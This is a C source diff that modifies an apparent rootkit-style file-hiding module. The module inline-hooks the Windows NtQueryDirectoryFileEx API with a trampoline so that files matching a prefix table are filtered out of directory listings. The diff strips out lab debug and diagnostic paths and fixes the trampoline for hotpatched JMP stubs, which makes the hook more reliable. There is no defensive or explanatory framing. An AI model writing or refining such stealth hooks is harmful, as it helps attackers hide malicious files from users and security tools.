@@ -68,18 +68,6 @@ static void set_next_offset(BYTE *entry, ULONG info_class, ULONG val)
 static NTSTATUS filter_entries(NTSTATUS status, PVOID FileInformation,
                                ULONG Length, ULONG FileInformationClass)
 {
-#ifdef FILE_HIDE_DEBUG
-    HANDLE hf = CreateFileA("C:\\lab\\debug_class.bin",
-                            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-    if (hf != INVALID_HANDLE_VALUE) {
-        DWORD w;
-        ULONG data[2] = { FileInformationClass, (ULONG)status };
-        WriteFile(hf, data, sizeof(data), &w, NULL);
-        CloseHandle(hf);
-    }
-    return status;
-#endif
-
     if (status != 0)
         return status;
 
@@ -166,9 +154,6 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
         FileInformation, Length, FileInformationClass,
         QueryFlags, FileName);
 
-#ifdef FILE_HIDE_DIAG
-    return status;
-#endif
     return filter_entries(status, FileInformation, Length, FileInformationClass);
 }
 
@@ -245,13 +230,26 @@ int file_hide_install(PrefixTable *table)
                          MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
         if (g_trampoline_ex) {
-            memcpy((void *)g_trampoline_ex, g_saved_ex, PATCH_SIZE);
-            write_abs_jmp((BYTE *)g_trampoline_ex + PATCH_SIZE,
-                          (BYTE *)g_original_ex + PATCH_SIZE);
+            BYTE *ex_ptr = (BYTE *)g_original_ex;
+
+            if (ex_ptr[0] == 0xE9) {
+                /* Forwarding stub (E9 = JMP rel32, e.g. hotpatch).
+                   Resolve absolute target and build trampoline as
+                   absolute JMP there — the relative displacement
+                   breaks when copied to a different address. */
+                INT32 disp = *(INT32 *)(ex_ptr + 1);
+                void *resolved = ex_ptr + 5 + disp;
+                write_abs_jmp((BYTE *)g_trampoline_ex, resolved);
+            } else {
+                /* Standard syscall stub: relocate first 16 bytes. */
+                memcpy((void *)g_trampoline_ex, g_saved_ex, PATCH_SIZE);
+                write_abs_jmp((BYTE *)g_trampoline_ex + PATCH_SIZE,
+                              ex_ptr + PATCH_SIZE);
+            }
 
             if (VirtualProtect((void *)g_original_ex, PATCH_SIZE,
                                PAGE_EXECUTE_READWRITE, &oldProt)) {
-                write_abs_jmp((BYTE *)g_original_ex,
+                write_abs_jmp(ex_ptr,
                               (void *)HookedNtQueryDirectoryFileEx);
                 VirtualProtect((void *)g_original_ex, PATCH_SIZE,
                                oldProt, &tmp);
